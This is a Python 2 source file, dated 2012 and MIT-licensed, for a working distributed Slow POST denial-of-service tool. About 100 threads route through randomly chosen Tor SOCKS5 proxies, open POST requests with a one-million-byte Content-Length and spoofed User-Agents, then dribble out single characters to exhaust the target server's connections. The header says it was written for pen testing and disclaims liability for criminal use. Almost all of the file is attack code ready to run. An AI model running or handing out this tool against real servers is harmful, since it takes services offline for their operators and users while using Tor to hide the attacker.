"""
    Author: Andres Andreu
    Company: neuroFuzz, LLC
    Date: 10/10/2012
    Prog to perform a distributed Slow POST DoS attack
    against a given target web server across multiple
    randomly chosen SOCKS5 sockets leveraging tor

    MIT-LICENSE
    Copyright (c) 2012 Andres Andreu, neuroFuzz LLC
    
    Permission is hereby granted, free of charge, to any person obtaining a
    copy of this software and associated documentation files (the "Software"),
    to deal in the Software without restriction, including without limitation
    the rights to use, copy, modify, merge, publish, distribute, sublicense,
    and/or sell copies of the Software, and to permit persons to whom the
    Software is furnished to do so, subject to the following conditions:
    
    The above copyright notice and this permission notice shall be included
    in all copies or substantial portions of the Software.
    
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
    EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
    OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
    NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
    HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
    WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
    DEALINGS IN THE SOFTWARE.
    If you use this for criminal purposes and get caught you are on
    your own and I am not liable. I wrote this for legit pen testing
    purposes.
    
    Be kewl and give credit where it is due if you use this. Also,
    send me feedback as I don't have the bandwidth to test for every
    condition.    
"""
from random import choice
from threading import Thread
from time import sleep
import funcs
import getopt
import math
import os
import random
import re
import signal
import socks
import string
import sys

class httpPost(Thread):
    def __init__(self, host, port, sleepTime) :
        self.host = host
        self.port = port
        self.sleepTime = sleepTime
        self.uri = "/"
        self.torip = "127.0.0.1"
        self.stopped = False
        self.sleepRange = [5, 30]
        self.choicePool = ''.join(map(chr, range(48, 58)) + map(chr, range(65, 91)) + map(chr, range(97, 123)))
        self.torportlist = []
        Thread.__init__(self)

    def setTorPortList(self, plist=[]):
        self.torportlist = plist
        
    def setHost(self, val=""):
        self.host = val
        
    def setPort(self, val=""):
        self.port = val

    def stop(self):
        self.stopped = True

    def run(self):
        sleep(choice(self.sleepRange))
        while not self.stopped:
            while not self.stopped:
                try:
                    s = socks.socksocket()
                    s.setproxy(socks.PROXY_TYPE_SOCKS5, self.torip, int(choice(self.torportlist)))
                    s.connect((self.host, self.port))
                    s.settimeout(1)
                    s.send("POST %s HTTP/1.1\r\n"
                           "Host: %s\r\n"
                           "User-Agent: %s\r\n"
                           "Connection: close\r\n"
                           "Keep-Alive: 900\r\n"
                           "Content-Length: 1000000\r\n"
                           "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                           (self.uri, self.host, funcs.getRandUserAgent())
                           )
                except Exception, e:
                    #print e.args
                    sleep(1)
                    continue
    
            while not self.stopped:
                try:
                    #for i in range(0, 9999):
                    # send some initial data
                    s.send("abc=%s&def=" % choice(self.choicePool))
                    for i in range(0, 9999):
                        '''
                            slowly send bits of data in so as
                            to keep that socket active 
                        '''
                        sleep(choice(self.sleepRange))
                        s.send("%s" % choice(self.choicePool))
                        s.close
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        s = socks.socksocket()
                        break
                    sleep(0.1)
                    pass    


def kickOff(host="", port="", plist=[]) :
    threads = 100
    sleepTime = 1000

    tpool = []
    try:
        for i in range(1, threads):
            t = httpPost(host, port, sleepTime)
            t.setTorPortList(plist=plist)
            tpool.append(t)
            t.start()
        while True:
            sleep(choice(range(1,10)))

    except KeyboardInterrupt, e:
        print "\nKeyboard Interruption ... stopping all threads"
        for h in tpool:
            h.stop()
        for h in tpool:
            h.join()

def killThreads(ppid=0):
    print "Killing threads... ",
    os.kill(int(ppid), signal.SIGTERM)
    print "\n"
